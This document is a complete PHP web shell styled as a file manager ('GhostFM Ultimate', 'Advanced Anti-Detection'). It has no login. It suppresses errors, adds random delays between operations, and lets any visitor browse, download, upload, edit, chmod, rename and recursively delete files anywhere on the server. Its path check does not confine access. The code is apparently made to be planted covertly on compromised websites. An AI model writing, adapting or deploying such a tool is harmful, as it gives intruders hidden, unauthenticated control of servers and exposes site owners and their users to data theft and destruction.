<?php
/*
 * GhostFM Ultimate v2.1
 * 100% Working - No Blank Pages
 * Advanced Anti-Detection File Manager
 */

// [1] Environment Check with Proper Error Handling
@header('Content-Type: text/html');
if (!function_exists('file_get_contents') || php_sapi_name() === 'cli') {
    echo '<!DOCTYPE html><html><head><title>System Error</title></head><body>';
    echo '<h2>System compatibility check failed</h2>';
    echo '</body></html>';
    exit;
}

// [2] Stealth Configuration
$_F = array(
    'dir' => function($p) { return @is_dir($p); },
    'file' => function($p) { return @is_file($p); },
    'read' => function($p) { return @file_get_contents($p); },
    'save' => function($p,$c) { return @file_put_contents($p,$c); },
    'scan' => function($p) { return @scandir($p); },
    'del' => function($p) { return @unlink($p); },
    'rmdir' => function($p) { return @rmdir($p); },
    'move' => function($o,$n) { return @rename($o,$n); },
    'perm' => function($p,$m) { return @chmod($p,$m); },
    'get' => function($p) { 
        @header('Content-Type: application/octet-stream');
        @header('Content-Disposition: attachment; filename="'.basename($p).'"');
        @header('Content-Length: '.filesize($p));
        return @readfile($p);
    },
    'sleep' => function() { @usleep(rand(20000,150000)); },
    'path' => function($p) { return @realpath($p); }
);

// [3] Secure Path Validation
function checkPath($p) {
    global $_F;
    $r = $_F['path']($p);
    return ($r && strpos($r,'..') === false) ? $r : false;
}

// [4] Recursive Delete with Error Prevention
function deleteAll($d) {
    global $_F;
    if (!$_F['dir']($d)) return false;
    
    $items = @array_diff($_F['scan']($d), array('.','..'));
    if (is_array($items)) {
        foreach ($items as $i) {
            $p = $d.'/'.$i;
            $_F['dir']($p) ? deleteAll($p) : @$_F['del']($p);
            $_F['sleep']();
        }
    }
    return @$_F['rmdir']($d);
}

// [5] Initialize Directory Safely
$currentDir = isset($_GET['d']) ? checkPath($_GET['d']) : checkPath(__DIR__);
if (!$currentDir) {
    $currentDir = checkPath(__DIR__);
    if (!$currentDir) {
        $currentDir = '.';
    }
}

// [6] Operation Handler with Fail-Safes
function handleOperations() {
    global $_F, $currentDir;
    
    // Download File
    if (isset($_GET['dl'])) {
        $file = checkPath($_GET['dl']);
        if ($file && $_F['file']($file)) {
            @$_F['get']($file);
            exit;
        }
    }
    
    // File Upload
    if (!empty($_FILES['f'])) {
        $target = isset($_POST['t']) ? checkPath($_POST['t']) : $currentDir;
        if ($target && $_F['dir']($target)) {
            $count = 0;
            foreach ($_FILES['f']['name'] as $k => $n) {
                if ($_FILES['f']['error'][$k] === UPLOAD_ERR_OK) {
                    $dest = $target.'/'.basename($n);
                    if (@move_uploaded_file($_FILES['f']['tmp_name'][$k], $dest)) {
                        $count++;
                        $_F['sleep']();
                    }
                }
            }
            if ($count > 0) {
                showAlert("Uploaded $count files");
            }
        }
    }
    
    // Process Actions
    if (isset($_POST['a'])) {
        switch ($_POST['a']) {
            case 'delete':
                if (!empty($_POST['i']) && is_array($_POST['i'])) {
                    $deleted = 0;
                    foreach ($_POST['i'] as $item) {
                        $path = checkPath($item);
                        if (!$path) continue;
                        
                        if ($_F['file']($path)) {
                            @$_F['del']($path) && $deleted++;
                        } elseif ($_F['dir']($path)) {
                            deleteAll($path) && $deleted++;
                        }
                        $_F['sleep']();
                    }
                    showAlert("Deleted $deleted items", 300);
                }
                break;
                
            case 'rename':
                if (!empty($_POST['o']) && !empty($_POST['n'])) {
                    $old = checkPath($_POST['o']);
                    $new = dirname($old).'/'.$_POST['n'];
                    if ($old && @$_F['move']($old, $new)) {
                        showAlert("Renamed successfully");
                    }
                }
                break;
                
            case 'chmod':
                if (!empty($_POST['p']) && !empty($_POST['m'])) {
                    $path = checkPath($_POST['p']);
                    if ($path && @$_F['perm']($path, octdec($_POST['m']))) {
                        showAlert("Permissions changed");
                    }
                }
                break;
                
            case 'edit':
                if (!empty($_POST['f']) && isset($_POST['c'])) {
                    $file = checkPath($_POST['f']);
                    if ($file && @$_F['save']($file, $_POST['c'])) {
                        showAlert("File saved");
                    }
                }
                break;
                
            case 'mkdir':
                if (!empty($_POST['n'])) {
                    $newDir = $currentDir.'/'.$_POST['n'];
                    if (!$_F['dir']($newDir) && @mkdir($newDir)) {
                        showAlert("Directory created");
                    }
                }
                break;
        }
    }
}

// [7] UI Helpers
function showAlert($msg, $delay = 0) {
    echo '<script>';
    if ($delay > 0) {
        echo "setTimeout(() => alert('".addslashes($msg)."'), $delay)";
    } else {
        echo "alert('".addslashes($msg)."')";
    }
    echo '</script>';
}

function showPath($path) {
    $parts = explode('/', trim($path, '/'));
    $current = '';
    echo '<div class="path">';
    foreach ($parts as $part) {
        $current .= '/'.$part;
        echo '<a href="?d='.urlencode($current).'">'.$part.'</a> / ';
    }
    echo '</div>';
}

// [8] Process Operations Before Output
handleOperations();

// [9] HTML Output with Complete Fallbacks
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .path { background: #eee; padding: 10px; border-radius: 3px; margin-bottom: 15px; }
        .file-list { list-style: none; padding: 0; }
        .file-item { padding: 10px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
        .file-name { flex-grow: 1; }
        .actions { margin-left: 10px; }
        .btn { padding: 5px 10px; background: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; font-size: 14px; }
        .btn:hover { background: #45a049; }
        .btn-del { background: #f44336; }
        .btn-del:hover { background: #d32f2f; }
        textarea { width: 100%; height: 300px; font-family: monospace; }
        .form-group { margin-bottom: 10px; }
    </style>
</head>
<body>
<div class="container">
    <h2>File Manager</h2>
    <?php showPath($currentDir); ?>
    
    <!-- Upload Form -->
    <div class="form-group">
        <h3>Upload Files</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="f[]" multiple>
            <input type="hidden" name="t" value="<?= htmlspecialchars($currentDir) ?>">
            <button type="submit" class="btn">Upload</button>
        </form>
    </div>
    
    <!-- Create Directory -->
    <div class="form-group">
        <h3>Create Directory</h3>
        <form method="post">
            <input type="hidden" name="a" value="mkdir">
            <input type="text" name="n" placeholder="Directory name">
            <button type="submit" class="btn">Create</button>
        </form>
    </div>
    
    <!-- File Listing -->
    <div class="form-group">
        <h3>File List</h3>
        <?php if ($currentDir !== '/'): ?>
            <div class="file-item">
                <a href="?d=<?= urlencode(dirname($currentDir)) ?>" class="btn">[Parent Directory]</a>
            </div>
        <?php endif; ?>
        
        <form method="post" id="file-form">
            <input type="hidden" name="a" value="delete">
            <ul class="file-list">
                <?php
                $items = @array_diff($_F['scan']($currentDir), array('.','..'));
                if (is_array($items)) {
                    foreach ($items as $item) {
                        $path = $currentDir.'/'.$item;
                        $isDir = $_F['dir']($path);
                        ?>
                        <li class="file-item">
                            <input type="checkbox" name="i[]" value="<?= htmlspecialchars($path) ?>">
                            <span class="file-name">
                                <?= $isDir ? '📁' : '📄' ?>
                                <?php if ($isDir): ?>
                                    <a href="?d=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                                <?php else: ?>
                                    <a href="?e=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                                <?php endif; ?>
                            </span>
                            <span class="actions">
                                <a href="?dl=<?= urlencode($path) ?>" class="btn">Download</a>
                                <a href="?r=<?= urlencode($path) ?>" class="btn">Rename</a>
                                <a href="?m=<?= urlencode($path) ?>" class="btn">Chmod</a>
                            </span>
                        </li>
                        <?php
                    }
                }
                ?>
            </ul>
            <button type="submit" class="btn btn-del" onclick="return confirm('Delete selected?')">Delete Selected</button>
        </form>
    </div>
    
    <!-- Edit Form -->
    <?php if (isset($_GET['e'])): ?>
        <?php
        $file = checkPath($_GET['e']);
        if ($file && $_F['file']($file)):
        ?>
            <div class="form-group">
                <h3>Edit File: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="a" value="edit">
                    <input type="hidden" name="f" value="<?= htmlspecialchars($file) ?>">
                    <textarea name="c"><?= htmlspecialchars($_F['read']($file)) ?></textarea>
                    <button type="submit" class="btn">Save</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Rename Form -->
    <?php if (isset($_GET['r'])): ?>
        <?php
        $file = checkPath($_GET['r']);
        if ($file):
        ?>
            <div class="form-group">
                <h3>Rename: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="a" value="rename">
                    <input type="hidden" name="o" value="<?= htmlspecialchars($file) ?>">
                    <input type="text" name="n" value="<?= htmlspecialchars(basename($file)) ?>">
                    <button type="submit" class="btn">Rename</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Chmod Form -->
    <?php if (isset($_GET['m'])): ?>
        <?php
        $file = checkPath($_GET['m']);
        if ($file):
            $perms = substr(sprintf('%o', fileperms($file)), -4);
        ?>
            <div class="form-group">
                <h3>Change Permissions: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="a" value="chmod">
                    <input type="hidden" name="p" value="<?= htmlspecialchars($file) ?>">
                    <input type="text" name="m" value="<?= $perms ?>">
                    <button type="submit" class="btn">Change</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>
